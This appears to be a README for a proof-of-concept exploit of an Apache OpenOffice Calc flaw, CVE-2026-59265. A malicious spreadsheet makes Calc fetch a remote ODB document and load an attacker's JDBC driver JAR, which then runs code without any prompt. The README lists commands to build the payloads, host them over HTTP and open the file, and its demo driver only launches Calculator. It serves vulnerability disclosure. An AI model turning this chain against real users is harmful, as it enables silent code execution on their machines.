# Apache OpenOffice Calc JDBC Classpath Code Execution

This vulnerability was discovered with [V12](https://v12.sh) by Rick de Jager
of the [V12 security team](https://x.com/v12sec).

> Want to find issues like this in your own code? Try V12 at
> [v12.sh](https://v12.sh).

Tracked as [CVE-2026-59265](https://nvd.nist.gov/vuln/detail/CVE-2026-59265); affects Apache OpenOffice through 4.1.16 and is expected to be fixed in 4.1.17.

## Abstract

This PoC demonstrates arbitrary Java bytecode execution when Apache OpenOffice
Calc opens a malicious spreadsheet. An auto-refreshing database range in the
spreadsheet references a remote `.odb` document, whose JDBC settings name an
attacker-controlled driver class and remote JAR.

Apache OpenOffice loads and instantiates the driver without a macro-style
safety warning or active-content prompt. The supplied demonstration driver
launches Calculator. Java and JDBC support must be installed and enabled.

## Exploitation

Generate the spreadsheet, ODB, and JDBC driver JAR:

```bash
python3 build_payloads.py --host-url http://127.0.0.1:8000
```

Serve the generated ODB and JAR:

```bash
cd hosted_artifacts
python3 -m http.server 8000 --bind 127.0.0.1
```

From another terminal, open the generated spreadsheet:

```bash
openoffice payloads/onefile-dbrange-http.ods
```

The executable may instead be named `openoffice4` or `soffice`. The HTTP server
receives requests for `poc-calculator.odb` and
`evil-calculator-driver.jar`, after which the driver attempts to launch
Calculator (`calc.exe` on Windows, Calculator on macOS, or `xcalc` on Linux).
Building the payload requires Apache OpenOffice, `javac`, and `jar`. Apache
OpenOffice 4.1.16 32-bit on Windows requires a 32-bit JRE.

## How It Works

1. Calc restores a persisted database range from the ODS and starts its
   automatic refresh.
2. The database range resolves its URL-like data source by fetching the remote
   ODB document.
3. The ODB supplies `JavaDriverClass` and a `JavaDriverClassPath` containing a
   remote `jar:http://...!/` URL.
4. Apache OpenOffice fetches the JAR and instantiates the named JDBC driver
   without first asking the user to trust the document.

See [REPORT.md](REPORT.md) for the full analysis and tested versions.

## Credit

Found with V12 by Rick de Jager of the V12 security team:
[v12.sh](https://v12.sh): dangerously powerful agentic security.
